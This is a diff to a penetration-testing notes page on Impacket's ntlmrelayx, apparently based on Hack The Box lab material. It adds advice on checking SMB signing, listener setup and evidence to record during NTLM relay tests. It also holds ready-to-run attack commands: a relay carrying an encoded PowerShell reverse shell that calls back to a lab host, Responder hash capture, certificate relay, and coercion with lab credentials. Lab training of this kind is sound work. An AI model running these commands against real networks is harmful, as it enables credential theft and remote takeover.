@@ -9,6 +9,68 @@ hideFooterPagination: true
 
 {/* Generated from Commands/ntlmrelayx.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Prove the authentication source and destination independently
+
+NTLM relay uses a live authentication exchange against another service. Capturing a challenge/response for offline password recovery is a separate process. Build a small diagram naming the authenticating client/account, your receiving listener and the destination protocol/host.
+
+### Inspect the destination first
+
+```bash
+nmap -Pn -p 445 --script smb2-security-mode TARGET_IP
+nxc smb TARGET_IP
+```
+
+Required SMB signing blocks the usual relay path to that SMB destination. LDAP signing/channel binding and HTTP extended protection concern other destinations; one service's setting does not establish another's behavior. Verify that the relayed identity has useful rights on the intended service.
+
+### Confirm listener and target configuration
+
+```bash
+ss -lntup
+impacket-ntlmrelayx -h
+```
+
+Resolve port conflicts before running a receiving service. If combining a name-resolution listener with a relay component in a lab, configure their responsibilities explicitly so they do not compete for the same address/port. Choose the destination from observed evidence rather than passing an unreviewed list of every host.
+
+### Interpret the exchange by stage
+
+| Stage | Evidence to preserve |
+| --- | --- |
+| Incoming authentication | Client address, account/domain, protocol and timestamp |
+| Destination connection | Actual destination host/port and negotiated service |
+| Authentication result | Accepted/rejected exchange and protection-related errors |
+| Authorized action | The specific resource or operation the identity can access |
+| Returned artifact | Session, ticket, certificate or command result with its identity |
+
+An incoming connection with no useful result can mean the destination is protected, the exchange is incompatible, or the identity lacks the necessary rights. Repeatedly changing listeners will not fix a destination authorization problem.
+
+Use the worked relay/certificate recipes below only after those prerequisites match. Preserve exact tool versions and configuration with the result; protocol protections and server patches can invalidate assumptions from older lab material. End the test by stopping the listeners and restoring any configuration changed for the exercise.
+
+## ntlmrelayx.py: choose the operation and read the result
+
+Relay an incoming NTLM authentication to an eligible lab service.
+
+### What the result establishes
+
+Identify the inbound authentication source, relay destination protocol and the action permitted by that identity.
+
+### Prerequisites and common failures
+
+Signing, channel binding, EPA and protocol-specific rights can prevent relay; captured authentication is not a reusable plaintext password.
+
+An applicable relay path in the lab; SMB signing, EPA, or channel binding can prevent relay.
+
+### Example 1: SMB relay listener
+
+Run in: **Kali**. Requires incoming authentication and a target that does not require SMB signing. Do not run a second SMB listener on the same port.
+
+```bash
+sudo impacket-ntlmrelayx -t smb://TARGET_IP -smb2support
+```
+
+## Saved commands and notebook recipes
+
+Relay an incoming NTLM authentication to an eligible lab service.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=ntlmrelayx) · [All tools](/index)
@@ -72,11 +134,25 @@ test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
 [*] Restoring the disabled state for service RemoteRegistry
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Forced Authentication Attacks](/modules/common-services/full-reference#forced-authentication-attacks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Common Services: Full Module Reference**
 
 ```bash
 grcic550@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Forced Authentication Attacks](/modules/common-services/full-reference#forced-authentication-attacks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -91,6 +167,13 @@ grcic550@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168
 sudo responder -I tun0                 # capture the NetNTLM hash to crack offline
 # (or) sudo impacket-ntlmrelayx -t <other-host> -smb2support   # relay it instead of cracking
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — When you don't have sysadmin: steal the service account's hash with xp_dirtree](/enumeration/mssql-microsoft-sql-server-cheat-sheet#when-you-dont-have-sysadmin-steal-the-service-accounts-hash-with-xp_dirtree) · [Responder — Interface and Startup — Example 7: When you don't have sysadmin: steal the service account's hash with xp_dirtree](/tools/responder#example-7-when-you-dont-have-sysadmin-steal-the-service-accounts-hash-with-xp_dirtree)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -108,6 +191,13 @@ certipy relay -target http://10.129.234.172 -template KerberosAuthentication -ti
 coercer coerce -u wwhite -p 'package5shores_topher1' -d inlanefreight.local \
   -t 10.129.234.174 -l <tun0-IP> --filter-method-name EfsRpcAddUsersToFile
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Certificate: PKINIT and Lab Walkthrough — Step 1 — relay + coerce (the cert)](/password-attacks/pass-the-certificate#step-1-—-relay-+-coerce-the-cert)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -167,6 +257,13 @@ MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiMAgEA
 <SNIP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Historical AD Vulnerability Labs — Catching Base64 Encoded Certificate for DC01](/active-directory/historical-vulnerability-labs#catching-base64-encoded-certificate-for-dc01)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Starting ntlmrelayx.py">
@@ -212,6 +309,22 @@ Copyright 2021 SecureAuth Corporation
 [*] Servers started, waiting for connections
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Historical AD Vulnerability Labs — Starting ntlmrelayx.py](/active-directory/historical-vulnerability-labs#starting-ntlmrelayx-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Microsoft SQL Server Enumeration](/enumeration/mssql-microsoft-sql-server-cheat-sheet)
+- [Pass the Certificate: PKINIT and Lab Walkthrough](/password-attacks/pass-the-certificate)
+
+{/* VAULT_RELATED_END */}
